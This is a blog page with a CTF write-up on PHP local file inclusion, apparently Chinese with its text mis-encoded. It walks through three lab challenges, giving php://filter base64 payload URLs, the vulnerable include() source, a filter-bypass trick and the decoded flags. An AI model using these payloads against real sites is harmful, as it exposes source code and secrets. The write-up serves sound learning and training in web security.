<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-CTF-Web-æ–‡ä»¶åŒ…å«" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/22/CTF-Web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
  <time class="dt-published" datetime="2021-01-22T06:44:29.000Z" itemprop="datePublished">2021-01-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/22/CTF-Web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">CTF-Web-æ–‡ä»¶åŒ…å«</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h1><p>æ¥æºï¼šBSidesCF2020</p>
<p>è€ƒå¯Ÿï¼šphpä¼ªåè®®ç»•è¿‡</p>
<p>è¿›å…¥é¡µé¢ï¼Œæœ‰ä¸¤ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»åå‘ç°URLæœ‰å˜åŒ–ï¼ŒçŒœæµ‹ä¸ºphpä¼ªåè®®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;06c5fe33-f46d-4bc0-9393-c91435db174c.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PGh0bWw+CiAgPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJYLVVBLUNvbXBhdGlibGUiIGNvbnRlbnQ9IklFPWVkZ2UiPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IkltYWdlcyB0aGF0IHNwYXJrIGpveSI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCwgbWluaW11bS1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkhhZCBhIGJhZCBkYXk&#x2F;PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iY3NzL21hdGVyaWFsLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJwYWdlLWxheW91dCBtZGwtbGF5b3V0IG1kbC1sYXlvdXQtLWZpeGVkLWhlYWRlciBtZGwtanMtbGF5b3V0IG1kbC1jb2xvci0tZ3JleS0xMDAiPgogICAgICA8aGVhZGVyIGNsYXNzPSJwYWdlLWhlYWRlciBtZGwtbGF5b3V0X19oZWFkZXIgbWRsLWxheW91dF9faGVhZGVyLS1zY3JvbGwgbWRsLWNvbG9yLS1ncmV5LTEwMCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAiPgogICAgICAgIDxkaXYgY2xhc3M9Im1kbC1sYXlvdXRfX2hlYWRlci1yb3ciPgogICAgICAgICAgPHNwYW4gY2xhc3M9Im1kbC1sYXlvdXQtdGl0bGUiPkhhZCBhIGJhZCBkYXk&#x2F;PC9zcGFuPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWxheW91dC1zcGFjZXIiPjwvZGl2PgogICAgICAgIDxkaXY+CiAgICAgIDwvaGVhZGVyPgogICAgICA8ZGl2IGNsYXNzPSJwYWdlLXJpYmJvbiI+PC9kaXY+CiAgICAgIDxtYWluIGNsYXNzPSJwYWdlLW1haW4gbWRsLWxheW91dF9fY29udGVudCI+CiAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jb250YWluZXIgbWRsLWdyaWQiPgogICAgICAgICAgPGRpdiBjbGFzcz0ibWRsLWNlbGwgbWRsLWNlbGwtLTItY29sIG1kbC1jZWxsLS1oaWRlLXRhYmxldCBtZGwtY2VsbC0taGlkZS1waG9uZSI+PC9kaXY+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWNvbnRlbnQgbWRsLWNvbG9yLS13aGl0ZSBtZGwtc2hhZG93LS00ZHAgY29udGVudCBtZGwtY29sb3ItdGV4dC0tZ3JleS04MDAgbWRsLWNlbGwgbWRsLWNlbGwtLTgtY29sIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jcnVtYnMgbWRsLWNvbG9yLXRleHQtLWdyZXktNTAwIj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxoMz5DaGVlciB1cCE8L2gzPgogICAgICAgICAgICAgIDxwPgogICAgICAgICAgICAgICAgRGlkIHlvdSBoYXZlIGEgYmFkIGRheT8gRGlkIHRoaW5ncyBub3QgZ28geW91ciB3YXkgdG9kYXk&#x2F;IEFyZSB5b3UgZmVlbGluZyBkb3duPyBQaWNrIGFuIG9wdGlvbiBhbmQgbGV0IHRoZSBhZG9yYWJsZSBpbWFnZXMgY2hlZXIgeW91IHVwIQogICAgICAgICAgICAgIDwvcD4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJwYWdlLWluY2x1ZGUiPgogICAgICAgICAgICAgIDw&#x2F;cGhwCgkJCQkkZmlsZSA9ICRfR0VUWydjYXRlZ29yeSddOwoKCQkJCWlmKGlzc2V0KCRmaWxlKSkKCQkJCXsKCQkJCQlpZiggc3RycG9zKCAkZmlsZSwgIndvb2ZlcnMiICkgIT09ICBmYWxzZSB8fCBzdHJwb3MoICRmaWxlLCAibWVvd2VycyIgKSAhPT0gIGZhbHNlIHx8IHN0cnBvcyggJGZpbGUsICJpbmRleCIpKXsKCQkJCQkJaW5jbHVkZSAoJGZpbGUgLiAnLnBocCcpOwoJCQkJCX0KCQkJCQllbHNlewoJCQkJCQllY2hvICJTb3JyeSwgd2UgY3VycmVudGx5IG9ubHkgc3VwcG9ydCB3b29mZXJzIGFuZCBtZW93ZXJzLiI7CgkJCQkJfQoJCQkJfQoJCQkJPz4KCQkJPC9kaXY+CiAgICAgICAgICA8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiIGlkPSJjaG9pY2UiPgogICAgICAgICAgICAgIDxjZW50ZXI+PGJ1dHRvbiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2hvaWNlJykuc3VibWl0KCk7IiBuYW1lPSJjYXRlZ29yeSIgdmFsdWU9Indvb2ZlcnMiIGNsYXNzPSJtZGwtYnV0dG9uIG1kbC1idXR0b24tLWNvbG9yZWQgbWRsLWJ1dHRvbi0tcmFpc2VkIG1kbC1qcy1idXR0b24gbWRsLWpzLXJpcHBsZS1lZmZlY3QiIGRhdGEtdXBncmFkZWQ9IixNYXRlcmlhbEJ1dHRvbixNYXRlcmlhbFJpcHBsZSI+V29vZmVyczxzcGFuIGNsYXNzPSJtZGwtYnV0dG9uX19yaXBwbGUtY29udGFpbmVyIj48c3BhbiBjbGFzcz0ibWRsLXJpcHBsZSBpcy1hbmltYXRpbmciIHN0eWxlPSJ3aWR0aDogMTg5LjM1NnB4OyBoZWlnaHQ6IDE4OS4zNTZweDsgdHJhbnNmb3JtOiB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgdHJhbnNsYXRlKDMxcHgsIDI1cHgpOyI+PC9zcGFuPjwvc3Bhbj48L2J1dHRvbj4KICAgICAgICAgICAgICA8YnV0dG9uIG9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjaG9pY2UnKS5zdWJtaXQoKTsiIG5hbWU9ImNhdGVnb3J5IiB2YWx1ZT0ibWVvd2VycyIgY2xhc3M9Im1kbC1idXR0b24gbWRsLWJ1dHRvbi0tY29sb3JlZCBtZGwtYnV0dG9uLS1yYWlzZWQgbWRsLWpzLWJ1dHRvbiBtZGwtanMtcmlwcGxlLWVmZmVjdCIgZGF0YS11cGdyYWRlZD0iLE1hdGVyaWFsQnV0dG9uLE1hdGVyaWFsUmlwcGxlIj5NZW93ZXJzPHNwYW4gY2xhc3M9Im1kbC1idXR0b25fX3JpcHBsZS1jb250YWluZXIiPjxzcGFuIGNsYXNzPSJtZGwtcmlwcGxlIGlzLWFuaW1hdGluZyIgc3R5bGU9IndpZHRoOiAxODkuMzU2cHg7IGhlaWdodDogMTg5LjM1NnB4OyB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSB0cmFuc2xhdGUoMzFweCwgMjVweCk7Ij48L3NwYW4+PC9zcGFuPjwvYnV0dG9uPjwvY2VudGVyPgogICAgICAgICAgPC9mb3JtPgoKICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L21haW4+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSJqcy9tYXRlcmlhbC5taW4uanMiPjwvc2NyaXB0PgogIDwvYm9keT4KPC9odG1sPg&#x3D;&#x3D;	</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>base64è½¬ç åçš„index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;no no no&#x27;</span>);</span><br><span class="line"><span class="comment">//n1book&#123;afr_1_solved&#125; &lt;html&gt;</span></span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;Images that spark joy&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Had a bad day?&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/material.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;</span><br><span class="line">          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;</span><br><span class="line">          &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line">      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;</span><br><span class="line">      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;page-container mdl-grid&quot;&gt;</span><br><span class="line">          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;</span><br><span class="line">          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;h3&gt;Cheer up!&lt;/h3&gt;</span><br><span class="line">              &lt;p&gt;</span><br><span class="line">                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option <span class="keyword">and</span> let the adorable images cheer you up!</span><br><span class="line">              &lt;/p&gt;</span><br><span class="line">              &lt;div class=&quot;page-include&quot;&gt;</span><br><span class="line">              <span class="meta">&lt;?php</span></span><br><span class="line">				<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">						<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span>&#123;</span><br><span class="line">						<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="meta">?&gt;</span></span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">          &lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;get&quot;</span> id=<span class="string">&quot;choice&quot;</span>&gt;</span><br><span class="line">              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;</span><br><span class="line">              &lt;button onclick=&quot;document.getElementById(&#x27;choice&#x27;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;</span><br><span class="line">          &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;js/material.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;			&lt;Ã½Ã˜Â¯&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>çŒœæµ‹flagæ–‡ä»¶ä¸ºflagä¸ºflag.php</p>
<p>ç”±äºå­˜åœ¨è¿‡æ»¤ï¼Œåœ¨resouceå‰å†å¥—ä¸€å±‚ï¼Œå®ç°ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;06c5fe33-f46d-4bc0-9393-c91435db174c.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7MDM2OGVhODktNWIwNC00YjQ3LTk3ZDEtMmM0MjM1Nzg0MmE4fQo&#x2F;Pgo&#x3D; </span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> &#x2F;&#x2F; flag&#123;0368ea89-5b04-4b47-97d1-2c42357842a8&#125;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<h1 id="Secret-File1"><a href="#Secret-File1" class="headerlink" title="Secret File1"></a>Secret File1</h1><p>æ¥æºï¼šæå®¢å¤§æŒ‘æˆ˜ 2019</p>
<p>è€ƒå¯Ÿï¼šphp://filterä¼ªåè®®</p>
<p>æŸ¥çœ‹æºç ï¼Œæç¤ºè®¿é—®è¿™ä¸ªé“¾æ¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Archive_room.php</span><br></pre></td></tr></table></figure>
<p>è·³è½¬åï¼Œç»§ç»­æŸ¥çœ‹æºç ï¼Œæç¤ºè®¿é—®action.phpï¼Œä½†ä¼šè‡ªåŠ¨è·³è½¬åˆ°end.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;action.php</span><br><span class="line">&#x2F;end.php</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨burpæŠ“åŒ…ï¼Œæç¤ºè·³è½¬åˆ°è¯¥åœ°å€</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php  </span><br></pre></td></tr></table></figure>
<p>è®¿é—®åï¼Œæ˜¾ç¤ºæºç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>ä¾ç…§æºç ï¼Œæäº¤fileå‚æ•°ï¼Œåœ¨è¯¥å‚æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7NTk2OGNlNzEtYWVjNy00ZjllLTk1ZWYtMjk4ODZjM2NkM2VhfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;Ã¥Â•ÂŠÃ¥Â“ÂˆÃ¯Â¼ÂÃ¤Â½ Ã¦Â‰Â¾Ã¥ÂˆÂ°Ã¦ÂˆÂ‘Ã¤ÂºÂ†Ã¯Â¼ÂÃ¥ÂÂ¯Ã¦Â˜Â¯Ã¤Â½ Ã§ÂœÂ‹Ã¤Â¸ÂÃ¥ÂˆÂ°Ã¦ÂˆÂ‘QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;Ã¦ÂˆÂ‘Ã¥Â°Â±Ã¥ÂœÂ¨Ã¨Â¿Â™Ã©Â‡ÂŒ&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;5968ce71-aec7-4f9e-95ef-29886c3cd3ea&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;Ã¾fl&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h1><p>æ¥æºï¼šACTF2020 æ–°ç”Ÿèµ›</p>
<p>è€ƒå¯Ÿï¼šphp://filterä¼ªåè®®</p>
<p>è¿›å…¥ç½‘é¡µåï¼Œä¸€ç›´å¾€ä¸‹ç‚¹ï¼Œçœ‹åˆ°é“¾æ¥ä¸º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?file&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå¾—åˆ°base64ç¼–ç çš„flag.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7N2JkNWJjODAtYzRiNS00MzAxLWE5OWItYWI1ZDUyNjg2OGQzfQo&#x3D;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;7bd5bc80-c4b5-4301-a99b-ab5d526868d3&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


